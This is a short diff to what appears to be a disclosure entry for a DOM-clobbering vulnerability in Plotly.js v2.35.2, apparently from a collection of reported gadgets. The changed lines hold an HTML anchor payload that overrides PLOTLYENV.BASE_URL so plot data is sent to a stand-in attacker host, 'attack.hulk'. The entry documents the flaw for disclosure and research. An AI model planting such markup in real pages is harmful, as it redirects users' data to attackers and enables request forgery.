@@ -6,7 +6,7 @@
 + Stars: 16.9K
 + Version: v2.35.2
 + Fingerprint: `window.PLOTLYENV  !== undefined`
-+ Payload: ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>```
++ Payload: ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://attack.hulk/?a="></a>```
 + Impact: CSRF
 + CVE: N/A
 + Status: Reported
@@ -71,7 +71,7 @@ plots.sendDataToCloud = function(gd) {
 <!--Library-->
 
 <!--Payload-->
-<a id="PLOTLYENV" href="https://xxx.xxx.xxx/?a="></a>
-<a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>
+<a id="PLOTLYENV" href="https://attack.hulk/?a="></a>
+<a id="PLOTLYENV" name="BASE_URL" href="https://attack.hulk/?a="></a>
 <!--Payload-->
 ```
